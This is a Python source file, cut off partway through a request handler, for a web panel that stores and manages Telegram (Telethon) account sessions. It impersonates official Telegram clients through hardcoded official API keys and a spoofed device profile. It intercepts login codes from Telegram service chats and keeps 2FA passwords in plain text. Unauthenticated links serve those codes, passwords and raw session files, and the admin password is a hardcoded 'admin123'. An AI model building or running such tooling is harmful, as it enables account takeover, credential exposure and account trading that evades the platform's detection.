import asyncio
import uuid
import re
import os
import json
import shutil
import threading
import time
import secrets
from html import escape as html_escape
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse

from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError

ADMIN_PASSWORD = "admin123"
SERVER_PORT = 8000
SESSIONS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "sessions")

OFFICIAL_CLIENT_API_ID = 2040
OFFICIAL_CLIENT_API_HASH = "b18441a1ff607e10a989891a5462e627"

DEFAULT_API_ID = OFFICIAL_CLIENT_API_ID
DEFAULT_API_HASH = OFFICIAL_CLIENT_API_HASH

PLATFORM_API = {
    "android": (6, "eb06d4abfb49dc3eeb1aeb98ae0f581e"),
    "ios": (10840, "33c45224029d59cb3ad0c16576128f81"),
    "desktop": (OFFICIAL_CLIENT_API_ID, OFFICIAL_CLIENT_API_HASH),
    "desktop_windows": (OFFICIAL_CLIENT_API_ID, OFFICIAL_CLIENT_API_HASH),
    "desktop_linux": (OFFICIAL_CLIENT_API_ID, OFFICIAL_CLIENT_API_HASH),
    "macos": (2834, "6f75bc28c47b6a361b53943a2b70d0c5"),
    "custom": None
}

PLATFORM_OPTIONS = (
    ("android", "Android"),
    ("ios", "iOS"),
    ("desktop", "Desktop"),
    ("desktop_windows", "Desktop (Windows)"),
    ("desktop_linux", "Desktop (Linux)"),
    ("macos", "macOS"),
    ("custom", "Custom")
)

SETTINGS_PATH = os.path.join(SESSIONS_DIR, "settings.json")

os.makedirs(SESSIONS_DIR, exist_ok=True)

main_loop = asyncio.new_event_loop()
clients = {}
pending_logins = {}
client_locks = {}
file_lock = threading.RLock()
admin_sessions = set()
admin_sessions_lock = threading.Lock()
ACCOUNT_STATUS_CACHE = {}
ACCOUNT_STATUS_TTL = 30

BANNED_EXCEPTION_NAMES = {
    "UserDeactivatedBanError",
    "UserDeactivatedError",
    "PhoneNumberBannedError",
    "AuthKeyUnregisteredError",
    "SessionRevokedError",
    "UserBannedInChannelError",
    "ChannelPrivateError",
    "AuthKeyDuplicatedError",
}

COMMON_STYLE = """
:root{color-scheme:light dark;--bg:#f5f7fb;--panel:#ffffff;--panel2:#f1f4f8;--input:#ffffff;--text:#151922;--muted:#687386;--line:#dce2ea;--accent:#3478f6;--danger:#d94b5b;--success:#1aa56b;--sidebar:#ffffff}
@media(prefers-color-scheme:dark){:root{--bg:#0b0d12;--panel:#121722;--panel2:#181e2b;--input:#0e121b;--text:#f4f7fb;--muted:#9099aa;--line:#293143;--accent:#6ea8fe;--danger:#ff6b6b;--success:#48d597;--sidebar:#0e1118}}
*{box-sizing:border-box}html,body{margin:0;padding:0;min-height:100%;background:var(--bg);color:var(--text);font-family:Inter,system-ui,-apple-system,"Segoe UI",Arial,sans-serif}body{min-height:100vh}body.admin{padding:0;display:block}.container{width:100%;max-width:460px;margin:0 auto;padding:24px}.container.wide{max-width:none;padding:0}.card{background:var(--panel);border:1px solid var(--line);border-radius:16px;padding:20px}h1{font-size:22px;margin:0 0 20px}h2{font-size:15px;margin:0 0 14px}.label{font-size:11px;text-transform:uppercase;letter-spacing:.12em;color:var(--muted);margin:0 0 7px;font-weight:700}.value{border:1px solid var(--line);background:var(--panel2);border-radius:10px;padding:11px;min-height:44px;display:flex;align-items:center;justify-content:center;word-break:break-all;font-family:ui-monospace,monospace}.status{font-size:13px;color:var(--muted);text-align:center;margin:12px 0}.status.error{color:var(--danger);font-weight:700}.status.ok{color:var(--success);font-weight:700}.actions,.item-actions{display:flex;gap:8px;flex-wrap:wrap}.button,button,input[type="submit"]{appearance:none;border:1px solid var(--line);background:var(--panel2);color:var(--text);border-radius:9px;padding:9px 13px;font-size:13px;font-weight:650;text-decoration:none;cursor:pointer;transition:.15s}.button:hover,button:hover{border-color:var(--accent);transform:translateY(-1px)}.button.primary,button.primary{background:var(--accent);color:#fff;border-color:var(--accent)}.button.danger,button.danger{color:var(--danger);background:transparent;border-color:var(--danger)}.input,input[type="text"],input[type="password"],input[type="file"],input[type="number"],select{width:100%;border:1px solid var(--line);border-radius:9px;padding:10px 11px;font-size:13px;background:var(--input);color:var(--text);margin:0 0 12px}input:focus,select:focus{outline:none;border-color:var(--accent);box-shadow:0 0 0 3px color-mix(in srgb,var(--accent) 16%,transparent)}form{margin:0}.row{display:grid;grid-template-columns:1fr 1fr;gap:12px}.small{font-size:12px;color:var(--muted);word-break:break-all}.inline-form{display:inline-flex}.tag-form{display:flex;gap:8px;align-items:center;flex-wrap:wrap}.tag-form input{margin:0;flex:1;min-width:130px}.dashboard{display:grid;grid-template-columns:240px minmax(0,1fr);min-height:100vh}.sidebar{border-right:1px solid var(--line);background:var(--sidebar);padding:22px 14px;position:sticky;top:0;height:100vh}.brand{padding:8px 12px 24px;font-weight:800;font-size:20px;letter-spacing:.08em}.brand small{display:block;color:var(--muted);font-size:10px;letter-spacing:.14em;margin-top:5px}.nav-label{color:var(--muted);font-size:10px;font-weight:800;letter-spacing:.14em;padding:10px 12px}.nav-item{display:flex;align-items:center;gap:10px;padding:11px 12px;border-radius:9px;color:var(--muted);text-decoration:none;font-size:13px;margin:3px 0}.nav-item:hover,.nav-item.active{background:var(--panel2);color:var(--text)}.sidebar-bottom{position:absolute;bottom:20px;left:14px;right:14px}.main{padding:28px;max-width:1450px;width:100%;margin:0 auto}.topbar{display:flex;justify-content:space-between;align-items:center;margin-bottom:26px}.topbar h1{margin:0;font-size:25px}.subtitle{font-size:13px;color:var(--muted);margin-top:5px}.live{display:flex;align-items:center;gap:8px;color:var(--success);font-size:12px;font-weight:700}.dot{width:8px;height:8px;border-radius:50%;background:var(--success);box-shadow:0 0 12px var(--success)}.stats{display:grid;grid-template-columns:minmax(180px,320px);gap:14px;margin-bottom:18px}.stat{background:var(--panel);border:1px solid var(--line);border-radius:14px;padding:18px}.stat-value{font-size:28px;font-weight:800;margin-top:8px}.admin-grid{display:grid;grid-template-columns:minmax(320px,1fr) minmax(320px,1fr);gap:16px;margin-bottom:18px}.panel{background:var(--panel);border:1px solid var(--line);border-radius:14px;padding:18px}.panel-head{display:flex;justify-content:space-between;align-items:center;margin-bottom:16px}.panel-title{font-size:15px;font-weight:800}.panel-desc{font-size:12px;color:var(--muted);margin-top:4px}.accounts-head{display:flex;justify-content:space-between;align-items:center;margin:22px 0 12px}.accounts-list{display:grid;grid-template-columns:repeat(auto-fit,minmax(320px,1fr));gap:12px}.item{background:var(--panel);border:1px solid var(--line);border-radius:14px;padding:16px;word-break:break-all}.item-top{display:flex;justify-content:space-between;gap:12px;align-items:flex-start}.item-phone{font-size:16px;font-weight:800}.item-code{font-family:ui-monospace,monospace;background:var(--panel2);border:1px solid var(--line);border-radius:9px;padding:9px 10px;margin:13px 0}.account-meta{display:grid;grid-template-columns:1fr 1fr;gap:7px;margin:10px 0 14px}.account-meta .small{background:var(--panel2);border-radius:7px;padding:7px}.switch-row{display:flex;align-items:center;justify-content:space-between;gap:12px;border-top:1px solid var(--line);padding-top:13px;margin-top:12px}.switch{position:relative;display:inline-block;width:42px;height:23px}.switch input{opacity:0;width:0;height:0}.slider{position:absolute;inset:0;background:#8b95a7;border-radius:20px;cursor:pointer}.slider:before{content:"";position:absolute;width:17px;height:17px;left:3px;top:3px;background:#fff;border-radius:50%;transition:.2s}.switch input:checked+.slider{background:var(--success)}.switch input:checked+.slider:before{transform:translateX(19px)}@media(max-width:900px){.dashboard{grid-template-columns:1fr}.sidebar{position:static;height:auto;border-right:0;border-bottom:1px solid var(--line);padding:12px;display:flex;align-items:center;gap:10px}.brand{padding:5px 10px}.brand small,.nav-label,.sidebar-bottom{display:none}.nav{display:flex;gap:4px;overflow:auto}.nav-item{white-space:nowrap}.main{padding:18px}.stats,.admin-grid{grid-template-columns:1fr}.accounts-list{grid-template-columns:1fr}}.form-panel{max-width:900px}.bulk-panel{margin:18px 0}.bulk-list{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:8px;margin:12px 0}.bulk-option{display:flex;align-items:center;gap:9px;border:1px solid var(--line);background:var(--panel2);padding:10px;border-radius:9px;font-size:13px}.bulk-option input{width:auto;margin:0}.bulk-actions{display:flex;gap:8px;flex-wrap:wrap;margin-top:12px}@media(max-width:640px){.topbar{align-items:flex-start;gap:10px}.row{grid-template-columns:1fr}.account-meta{grid-template-columns:1fr}.item-top{flex-direction:column}.topbar h1{font-size:21px}}
"""

GETCODE_TEMPLATE = ("""<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Telegram Code</title>
<style>""" + COMMON_STYLE + """</style>
</head>
<body>
<div class="container">
<div class="card">
<h1>Telegram Code</h1>
<div class="label">Verification Code</div>
<div class="value">__CODE__</div>
<div class="label">2FA Password</div>
<div class="value">__2FA__</div>
<div class="__STATUS_CLASS__">__STATUS__</div>
<div class="actions">
<a class="button" href="/getcode/__ID__">Refresh</a>
__DOWNLOAD_BUTTON__
</div>
</div>
</div>
</body>
</html>
""")

SIMPLE_TEMPLATE = ("""<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>__TITLE__</title>
<style>""" + COMMON_STYLE + """</style>
</head>
<body>
<div class="container">
<div class="card">
<h1>__TITLE__</h1>
__BODY__
</div>
</div>
</body>
</html>
""")

ADMIN_TEMPLATE = """<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>__TITLE__ · TGAPI</title><style>__STYLE__</style></head><body class="admin"><div class="dashboard"><aside class="sidebar"><div class="brand">TGAPI<small>SESSION CONTROL PANEL</small></div><div class="nav-label">MANAGEMENT</div><nav class="nav"><a class="nav-item __DASH_ACTIVE__" href="/admin">Dashboard</a><a class="nav-item __LOGIN_ACTIVE__" href="/admin/login_new_account">Login New Account</a><a class="nav-item __IMPORT_ACTIVE__" href="/admin/import_session_page">Import Session</a></nav><div class="sidebar-bottom"><a class="nav-item" href="/admin/logout">Logout</a></div></aside><main class="main">__CONTENT__</main></div>__SCRIPT__</body></html>"""

LOGIN_NEW_ACCOUNT_CONTENT = """<div class="topbar"><div><h1>Login New Account</h1><div class="subtitle">Create a local Telethon session using a phone number and verification code.</div></div><div class="live"><span class="dot"></span> Server online</div></div><section class="panel form-panel"><div class="panel-head"><div><div class="panel-title">Account Login</div><div class="panel-desc">Choose an API platform, enter a phone number, then verify the Telegram login code.</div></div></div><form method="post" action="/admin/send_code"><div class="row"><div><div class="label">Phone</div><input type="text" name="phone" required></div><div><div class="label">API Platform</div><select class="platform-select" name="platform" onchange="updatePlatformInfo(this)">__PLATFORM_OPTIONS__</select><div class="small platform-info"></div></div></div><div class="row custom-api-fields"><div><div class="label">API_ID</div><input type="text" name="api_id" value="__API_ID_VALUE__" placeholder="Custom API_ID"></div><div><div class="label">API_HASH</div><input type="text" name="api_hash" value="__API_HASH_VALUE__" placeholder="Custom API_HASH"></div></div><div class="label">Tag</div><input type="text" name="tag" placeholder="optional"><div class="actions"><button class="primary" type="submit">Send Verification Code</button><a class="button" href="/admin">Cancel</a></div></form></section>"""

IMPORT_SESSION_CONTENT = """<div class="topbar"><div><h1>Import Session</h1><div class="subtitle">Import a native Telethon SQLite .session file into TGAPI.</div></div><div class="live"><span class="dot"></span> Server online</div></div><section class="panel form-panel"><div class="panel-head"><div><div class="panel-title">Session Import</div><div class="panel-desc">Phone and 2FA metadata are optional. The session itself is validated before import.</div></div></div><form method="post" action="/admin/import_session" enctype="multipart/form-data"><div class="label">Session File</div><input type="file" name="session_file" required><div class="row"><div><div class="label">Phone optional</div><input type="text" name="phone"></div><div><div class="label">2FA password optional</div><input type="password" name="password_2fa"></div></div><div class="row"><div><div class="label">API Platform</div><select class="platform-select" name="platform" onchange="updatePlatformInfo(this)">__PLATFORM_OPTIONS__</select><div class="small platform-info"></div></div><div><div class="label">Tag optional</div><input type="text" name="tag"></div></div><div class="row custom-api-fields"><div><div class="label">API_ID</div><input type="text" name="api_id" value="__API_ID_VALUE__" placeholder="Custom API_ID"></div><div><div class="label">API_HASH</div><input type="text" name="api_hash" value="__API_HASH_VALUE__" placeholder="Custom API_HASH"></div></div><div class="actions"><button class="primary" type="submit">Import Session</button><a class="button" href="/admin">Cancel</a></div></form></section>"""

COPY_SCRIPT = """<script>
function copyText(text) {
    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(text);
        return;
    }
    var ta = document.createElement("textarea");
    ta.value = text;
    document.body.appendChild(ta);
    ta.select();
    document.execCommand("copy");
    document.body.removeChild(ta);
}
</script>"""

PLATFORM_SCRIPT = """<script>
var PLATFORM_DATA = __PLATFORM_DATA__;

function platformText(value) {
    if (value === "custom") {
        return "Custom API credentials.";
    }

    var item = PLATFORM_DATA[value];

    if (!item) {
        return "";
    }

    return "API_ID: " + item[0] + " | API_HASH: " + item[1];
}

function updatePlatformInfo(sel) {
    var form = sel.form;

    if (!form) {
        return;
    }

    var info = form.querySelector(".platform-info");
    var fields = form.querySelectorAll(".custom-api-fields input");
    var custom = sel.value === "custom";

    if (info) {
        info.textContent = platformText(sel.value);
    }

    for (var i = 0; i < fields.length; i++) {
        fields[i].disabled = !custom;
        fields[i].required = custom;
        if (!custom) {
            fields[i].value = "";
        }
    }
}

document.addEventListener("DOMContentLoaded", function() {
    var selects = document.querySelectorAll("select.platform-select");

    for (var i = 0; i < selects.length; i++) {
        updatePlatformInfo(selects[i]);
    }
});
</script>"""



def load_settings():
    settings = {
        "platform": "desktop",
        "api_id": "",
        "api_hash": ""
    }
    changed = False

    try:
        with file_lock:
            with open(SETTINGS_PATH, "r", encoding="utf-8") as f:
                data = json.load(f)

        if isinstance(data, dict):
            settings.update(data)
    except Exception:
        pass

    settings["platform"] = str(settings.get("platform", "desktop") or "desktop").lower()

    if settings["platform"] not in PLATFORM_API:
        settings["platform"] = "desktop"
        changed = True

    settings["api_id"] = str(settings.get("api_id", "") or "")
    settings["api_hash"] = str(settings.get("api_hash", "") or "")

    if settings["platform"] != "custom":
        if settings["api_id"] or settings["api_hash"]:
            settings["api_id"] = ""
            settings["api_hash"] = ""
            changed = True

    if changed:
        save_settings(settings)

    return settings


def save_settings(settings):
    platform = str(settings.get("platform", "desktop") or "desktop").lower()

    if platform not in PLATFORM_API:
        platform = "desktop"

    api_id = str(settings.get("api_id", "") or "").strip()
    api_hash = str(settings.get("api_hash", "") or "").strip()

    if platform != "custom":
        api_id = ""
        api_hash = ""

    clean = {
        "platform": platform,
        "api_id": api_id,
        "api_hash": api_hash
    }

    with file_lock:
        tmp = SETTINGS_PATH + ".tmp"

        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(clean, f, ensure_ascii=False, indent=2)

        os.replace(tmp, SETTINGS_PATH)


def remember_credentials(platform, api_id_raw, api_hash_raw):
    platform = str(platform or "").strip().lower()
    settings = load_settings()
    settings["platform"] = platform

    if platform == "custom":
        settings["api_id"] = str(api_id_raw or "").strip()
        settings["api_hash"] = str(api_hash_raw or "").strip()
    else:
        settings["api_id"] = ""
        settings["api_hash"] = ""

    save_settings(settings)


def platform_options_html(selected):
    options = ""

    for value, label in PLATFORM_OPTIONS:
        selected_attr = " selected" if value == selected else ""
        options += f'<option value="{value}"{selected_attr}>{label}</option>'

    return options


def platform_display(meta):
    raw = str(meta.get("api_platform", "") or "").strip().lower()

    if raw:
        for key, label in PLATFORM_OPTIONS:
            if key == raw:
                pair = PLATFORM_API.get(key)

                if pair:
                    return f"{label} ({pair[0]})"

                return label

    try:
        api_id = int(meta.get("api_id") or 0)
    except Exception:
        api_id = 0

    api_hash = str(meta.get("api_hash") or "")

    if api_id and api_hash:
        seen = set()

        for key, label in PLATFORM_OPTIONS:
            if key in seen:
                continue

            seen.add(key)

            pair = PLATFORM_API.get(key)

            if pair and pair[0] == api_id and pair[1] == api_hash:
                return f"{label} ({pair[0]})"

    return "-"


def parse_credentials_with_platform(platform_raw, api_id_raw, api_hash_raw):
    platform = str(platform_raw or "").strip().lower()

    if platform not in PLATFORM_API:
        platform = "desktop"

    api_id_raw = str(api_id_raw or "").strip()
    api_hash_raw = str(api_hash_raw or "").strip()

    if api_id_raw and api_hash_raw:
        try:
            api_id = int(api_id_raw)
        except Exception:
            return None, None, platform, "Invalid API_ID."

        return api_id, api_hash_raw, platform, None

    if api_id_raw or api_hash_raw:
        return None, None, platform, "API_ID and API_HASH must be both empty or both filled."

    if platform == "custom":
        return None, None, platform, "Custom platform requires API_ID and API_HASH."

    api_id, api_hash = PLATFORM_API[platform]
    return api_id, api_hash, platform, None


def simple_page(title, body):
    return SIMPLE_TEMPLATE.replace("__TITLE__", html_escape(title)).replace("__BODY__", body)


def message_page(title, message):
    body = f'''<p>{html_escape(message)}</p><div class="actions"><a class="button" href="/admin">Back</a></div>'''
    return simple_page(title, body)


def get_status_display(status):
    if status == "ok":
        return "Account active", "status ok"

    if status == "banned":
        return "Account frozen / banned", "status error"

    if status == "deleted":
        return "Account deleted", "status error"

    if status == "flood":
        return "Rate limited, retry later", "status warn"

    if status == "no_session":
        return "Session unavailable", "status error"

    if status == "timeout":
        return "Status check timeout", "status warn"

    return "Status unknown", "status warn"


async def check_account_status(account_id, client):
    now = time.time()

    cached = ACCOUNT_STATUS_CACHE.get(account_id)
    if cached and now - cached[0] < ACCOUNT_STATUS_TTL:
        return cached[1]

    status = "unknown"

    try:
        me = await client.get_me()

        if getattr(me, "deleted", False):
            status = "deleted"
        else:
            status = "ok"

    except Exception as e:
        name = type(e).__name__

        if name in BANNED_EXCEPTION_NAMES:
            status = "banned"
        elif name == "FloodWaitError":
            status = "flood"
        else:
            status = "error"

    ACCOUNT_STATUS_CACHE[account_id] = (now, status)
    return status


def is_safe_account_id(value):
    return bool(re.fullmatch(r"[A-Za-z0-9_\-]+", value or ""))


def is_uuid(value):
    return bool(
        re.fullmatch(
            r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}",
            value or "",
            re.IGNORECASE
        )
    )


def session_path(account_id):
    return os.path.join(SESSIONS_DIR, f"{account_id}.session")


def session_base(account_id):
    return os.path.join(SESSIONS_DIR, account_id)


def meta_path(account_id):
    return os.path.join(SESSIONS_DIR, f"{account_id}.meta.json")


def remove_session_files(base):
    for path in (base + ".session", base + ".session-journal"):
        try:
            os.remove(path)
        except Exception:
            pass


def cleanup_temporary_sessions():
    if not os.path.isdir(SESSIONS_DIR):
        return

    for name in os.listdir(SESSIONS_DIR):
        if (name.startswith("_tmp_") or name.startswith("_import_")) and (
            name.endswith(".session") or name.endswith(".session-journal")
        ):
            try:
                os.remove(os.path.join(SESSIONS_DIR, name))
            except Exception:
                pass


def load_meta(account_id):
    path = meta_path(account_id)

    if not os.path.exists(path):
        return None

    with file_lock:
        try:
            with open(path, "r", encoding="utf-8") as f:
                data = json.load(f)
        except Exception:
            return None

    if not isinstance(data, dict):
        return None

    data.setdefault("phone", "")
    data.setdefault("api_id", DEFAULT_API_ID)
    data.setdefault("api_hash", DEFAULT_API_HASH)
    data.setdefault("api_platform", "")
    data.setdefault("password_2fa", "")
    data.setdefault("latest_code", "")
    data.setdefault("latest_code_ts", 0)
    data.setdefault("tag", "")
    data.setdefault("created_at", 0)
    data.setdefault("allow_session_download", True)
    data["allow_session_download"] = bool(data.get("allow_session_download", True))
    data["id"] = account_id

    return data


def save_meta(account_id, meta):
    meta = dict(meta)
    meta.pop("id", None)

    clean = {
        "phone": str(meta.get("phone", "")),
        "api_id": meta.get("api_id", DEFAULT_API_ID),
        "api_hash": str(meta.get("api_hash", DEFAULT_API_HASH)),
        "api_platform": str(meta.get("api_platform", "")),
        "password_2fa": str(meta.get("password_2fa", "")),
        "latest_code": str(meta.get("latest_code", "")),
        "latest_code_ts": meta.get("latest_code_ts", 0),
        "tag": str(meta.get("tag", "")),
        "created_at": meta.get("created_at", 0),
        "allow_session_download": bool(meta.get("allow_session_download", True))
    }

    try:
        clean["api_id"] = int(clean["api_id"] or DEFAULT_API_ID)
    except Exception:
        clean["api_id"] = DEFAULT_API_ID

    try:
        clean["latest_code_ts"] = float(clean["latest_code_ts"] or 0)
    except Exception:
        clean["latest_code_ts"] = 0

    try:
        clean["created_at"] = float(clean["created_at"] or 0)
    except Exception:
        clean["created_at"] = 0

    path = meta_path(account_id)

    with file_lock:
        tmp = path + ".tmp"

        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(clean, f, ensure_ascii=False, indent=2)

        os.replace(tmp, path)


def update_meta(account_id, **fields):
    meta = load_meta(account_id)

    if meta is None:
        return None

    meta.update(fields)
    save_meta(account_id, meta)

    return meta


def migrate_legacy_sessions():
    if not os.path.isdir(SESSIONS_DIR):
        return

    for name in os.listdir(SESSIONS_DIR):
        if not name.endswith(".session"):
            continue

        account_id = name[:-8]

        if account_id.startswith("_tmp_") or account_id.startswith("_import_"):
            continue

        if not is_safe_account_id(account_id):
            continue

        if is_uuid(account_id):
            continue

        new_id = str(uuid.uuid4())

        try:
            shutil.move(session_path(account_id), session_path(new_id))
        except Exception:
            continue

        old_meta = meta_path(account_id)

        if os.path.exists(old_meta):
            try:
                shutil.move(old_meta, meta_path(new_id))
            except Exception:
                pass
        else:
            save_meta(new_id, {
                "phone": account_id,
                "api_id": DEFAULT_API_ID,
                "api_hash": DEFAULT_API_HASH,
                "api_platform": "",
                "password_2fa": "",
                "latest_code": "",
                "latest_code_ts": 0,
                "tag": "",
                "created_at": 0,
                "allow_session_download": True
            })

        remove_session_files(session_base(account_id))


def list_accounts():
    records = []

    if not os.path.isdir(SESSIONS_DIR):
        return []

    for name in sorted(os.listdir(SESSIONS_DIR)):
        if not name.endswith(".session"):
            continue

        account_id = name[:-8]

        if account_id.startswith("_tmp_") or account_id.startswith("_import_"):
            continue

        if not is_safe_account_id(account_id):
            continue

        meta = load_meta(account_id)

        if meta is None:
            meta = {
                "phone": "",
                "api_id": DEFAULT_API_ID,
                "api_hash": DEFAULT_API_HASH,
                "api_platform": "",
                "password_2fa": "",
                "latest_code": "",
                "latest_code_ts": 0,
                "tag": "",
                "created_at": 0,
                "allow_session_download": True
            }

            save_meta(account_id, meta)
            meta["id"] = account_id

        sort_ts = 0

        try:
            sort_ts = float(meta.get("created_at", 0) or 0)
        except Exception:
            sort_ts = 0

        if sort_ts <= 0:
            try:
                sort_ts = os.path.getmtime(session_path(account_id))
            except Exception:
                sort_ts = 0

        records.append((sort_ts, meta))

    records.sort(key=lambda item: item[0], reverse=True)
    return [item[1] for item in records]


def find_account_id_by_phone(phone):
    phone = str(phone or "").replace("+", "").strip()

    if not phone or not os.path.isdir(SESSIONS_DIR):
        return None

    for name in os.listdir(SESSIONS_DIR):
        if not name.endswith(".session"):
            continue

        account_id = name[:-8]

        if account_id.startswith("_tmp_") or account_id.startswith("_import_"):
            continue

        if not is_safe_account_id(account_id):
            continue

        meta = load_meta(account_id)

        if meta and str(meta.get("phone", "")) == phone:
            return account_id

    return None


def delete_account(account_id):
    ACCOUNT_STATUS_CACHE.pop(account_id, None)

    with file_lock:
        for path in (
            session_path(account_id),
            session_path(account_id) + "-journal",
            meta_path(account_id)
        ):
            try:
                os.remove(path)
            except Exception:
                pass


def get_client_lock(account_id):
    if account_id not in client_locks:
        client_locks[account_id] = asyncio.Lock()

    return client_locks[account_id]


def create_client(base, api_id, api_hash):
    return TelegramClient(
        base,
        api_id,
        api_hash,
        device_model="Desktop",
        system_version="Windows 10",
        app_version="3.4.3 x64",
        lang_code="en",
        system_lang_code="en-US"
    )


def get_credentials(meta):
    api_id = DEFAULT_API_ID
    api_hash = DEFAULT_API_HASH

    if meta:
        try:
            api_id = int(meta.get("api_id") or DEFAULT_API_ID)
        except Exception:
            api_id = DEFAULT_API_ID

        api_hash = str(meta.get("api_hash") or DEFAULT_API_HASH)

    return api_id, api_hash


async def ensure_client(account_id):
    lock = get_client_lock(account_id)

    async with lock:
        if account_id in clients:
            client = clients[account_id]

            try:
                if client.is_connected() and await client.is_user_authorized():
                    return client
            except Exception:
                pass

            clients.pop(account_id, None)

            try:
                await client.disconnect()
            except Exception:
                pass

        if not os.path.exists(session_path(account_id)):
            return None

        meta = load_meta(account_id)
        api_id, api_hash = get_credentials(meta)

        client = create_client(session_base(account_id), api_id, api_hash)

        try:
            await client.connect()

            if not await client.is_user_authorized():
                await client.disconnect()
                return None

            clients[account_id] = client

            @client.on(events.NewMessage)
            async def handler(event):
                try:
                    if event.chat_id in (777000, 42777, 424000, 42400, 33300, 22222):
                        text = event.message.message or ""
                        match = re.search(r"\b(\d{5,6})\b", text)

                        if match:
                            update_meta(
                                account_id,
                                latest_code=match.group(1),
                                latest_code_ts=time.time()
                            )
                except Exception:
                    pass

            main_loop.create_task(client.run_until_disconnected())

            async def monitor_disconnect():
                try:
                    await client.disconnected
                except Exception:
                    pass

                clients.pop(account_id, None)

            main_loop.create_task(monitor_disconnect())

            return client

        except Exception:
            try:
                await client.disconnect()
            except Exception:
                pass

            return None


def parse_multipart(body, content_type):
    fields = {}
    files = {}

    if not body or not content_type or "boundary=" not in content_type:
        return fields, files

    boundary = content_type.split("boundary=")[-1].strip().strip('"')

    if not boundary:
        return fields, files

    delimiter = b"--" + boundary.encode("utf-8")
    parts = body.split(delimiter)

    for part in parts:
        if not part:
            continue

        part = part.lstrip(b"\r\n")

        if part.startswith(b"--"):
            continue

        if part.endswith(b"\r\n"):
            part = part[:-2]

        if b"\r\n\r\n" not in part:
            continue

        header_blob, content = part.split(b"\r\n\r\n", 1)

        if content.endswith(b"\r\n"):
            content = content[:-2]

        headers = {}

        for line in header_blob.split(b"\r\n"):
            if b":" in line:
                k, v = line.split(b":", 1)
                headers[k.strip().lower().decode("latin-1", "ignore")] = v.strip().decode("latin-1", "ignore")

        disp = headers.get("content-disposition", "")

        if 'name="' not in disp:
            continue

        try:
            name = disp.split('name="')[1].split('"')[0]
        except Exception:
            continue

        if 'filename="' in disp:
            try:
                filename = disp.split('filename="')[1].split('"')[0]
            except Exception:
                filename = ""

            files[name] = {
                "filename": filename,
                "content": content
            }
        else:
            fields[name] = content.decode("utf-8", "ignore")

    return fields, files


def get_first(container, key, default=""):
    value = container.get(key, default)

    if isinstance(value, list):
        return value[0] if value else default

    if value is None:
        return default

    return value


class Handler(BaseHTTPRequestHandler):

    def log_message(self, format, *args):
        pass

    def _send_html(self, code, html):
        self.send_response(code)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(html.encode("utf-8"))

    def _redirect(self, url, cookie=None):
        self.send_response(302)
        self.send_header("Location", url)

        if cookie:
            self.send_header("Set-Cookie", cookie)

        self.end_headers()

    def _get_base_url(self):
        host = self.headers.get("Host", f"localhost:{SERVER_PORT}")
        proto = self.headers.get("X-Forwarded-Proto", "http")

        return f"{proto}://{host}"

    def _get_admin_session_token(self):
        cookie = self.headers.get("Cookie", "")

        for item in cookie.split(";"):
            item = item.strip()
            if item.startswith("admin_session="):
                return item.split("=", 1)[1]

        return ""

    def _admin_logged_in(self):
        token = self._get_admin_session_token()

        if not token:
            return False

        with admin_sessions_lock:
            return token in admin_sessions

    def do_GET(self):
        path = urlparse(self.path).path

        if path == "/admin/login":
            body = '''<form method="post" action="/admin/auth">
<div class="label">Password</div>
<input type="password" name="pwd" required>
<div class="actions">
<button type="submit">Login</button>
</div>
</form>'''
            self._send_html(200, simple_page("Admin Login", body))
            return

        if path.startswith("/getcode/"):
            account_id = path.split("/getcode/", 1)[-1].strip("/")

            if not is_safe_account_id(account_id):
                self._send_html(404, "Not found")
                return

            meta = load_meta(account_id)

            if meta is None or not os.path.exists(session_path(account_id)):
                self._send_html(404, "Not found")
                return

            async def prepare_page():
                client = await ensure_client(account_id)

                if client is None:
                    return "no_session"

                return await check_account_status(account_id, client)

            future = asyncio.run_coroutine_threadsafe(prepare_page(), main_loop)

            try:
                status = future.result(timeout=10)
            except Exception:
                status = "timeout"

            meta = load_meta(account_id) or meta

            code = str(meta.get("latest_code", ""))

            try:
                code_ts = float(meta.get("latest_code_ts", 0) or 0)
            except Exception:
                code_ts = 0

            if code and time.time() - code_ts <= 1200:
                code_html = html_escape(code)
            else:
                code_html = "Waiting..."

            twofa = str(meta.get("password_2fa", "")) or "None"
            if meta.get("allow_session_download", True):
                download_button = '<a class="button" href="/downloadsession/{0}">Download Session</a>'.format(
                    html_escape(account_id, quote=True)
                )
            else:
                download_button = ""

            status_text, status_class = get_status_display(status)

            html = (
                GETCODE_TEMPLATE
                .replace("__CODE__", code_html)
                .replace("__2FA__", html_escape(twofa))
                .replace("__ID__", html_escape(account_id, quote=True))
                .replace("__STATUS__", html_escape(status_text))
                .replace("__STATUS_CLASS__", status_class)
                .replace("__DOWNLOAD_BUTTON__", download_button)
            )

            self._send_html(200, html)
            return

        if path.startswith("/downloadsession/"):
            account_id = path.split("/downloadsession/", 1)[-1].strip("/")

            if not is_safe_account_id(account_id):
                self._send_html(404, "Not found")
                return

            meta = load_meta(account_id)
            if meta is None or not meta.get("allow_session_download", True):
                self._send_html(403, "Session download is disabled.")
                return

            path_to_session = session_path(account_id)
            if not os.path.isfile(path_to_session):
                self._send_html(404, "Not found")
                return

            try:
                with open(path_to_session, "rb") as f:
                    data = f.read()

                self.send_response(200)
                self.send_header("Content-Type", "application/octet-stream")
                api_id, api_hash = get_credentials(meta)
                phone = str(meta.get("phone", "") or "").strip()
                if phone and not phone.startswith("+"):
                    phone = "+" + phone
                download_name = f"{phone}-{api_id}-{api_hash}.session"
                self.send_header(
                    "Content-Disposition",
                    f'attachment; filename="{download_name}"'
                )
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)
            except Exception:
